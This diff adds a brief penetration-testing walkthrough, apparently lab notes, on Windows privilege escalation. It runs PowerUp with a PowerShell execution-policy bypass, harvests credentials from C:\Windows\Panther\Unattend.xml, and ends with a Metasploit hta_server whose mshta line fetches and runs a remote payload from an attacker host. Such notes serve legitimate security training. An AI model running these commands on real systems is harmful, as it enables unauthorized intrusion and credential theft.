@@ -1,0 +1,54 @@
+### Unattended installation (Priv Escalation)
+
+---
+
+##### PowerSploit
+
+PowerSploit is a collection of Microsoft PowerShell modules that can be used by penetration testers during all phases of an assessment. 
+
+---
+
+##### PowerUp.ps1
+
+PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. 
+
+---
+
+##### Commands: Powershell.exe
+
+> - cd .\Desktop\PowerSploit\Privesc\
+> - powershell -ep bypass (PowerShell execution policy bypass)
+> - Import PowerUp.ps1
+> - Invoke-PrivescAudit *or* Invoke-AllChecks
+
+---
+
+##### Exploitation
+
+With the powershell script, we are able to identify one misconfig with unattended xml file.
+
+Unattend.xml is an answer file for installation. The files may contain encoded or plain-text credentials and other sensitive information. 
+
+**Path** : ***C:\Windows\Panther\Unattend.xml***
+
+**File Section** : AutoLogon
+
+NB : The password is encoded in base64
+
+---
+
+##### Run hta_server module with elevated privs
+
+runas.exe /user:administrator cmd
+
+> - msfconsole -q
+> - use exploit/windows/misc/hta_server
+> - exploit
+
+---
+
+##### On the target machine
+
+*Note*: You need to use your own metasploit HTA server link
+
+> - Payload: mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
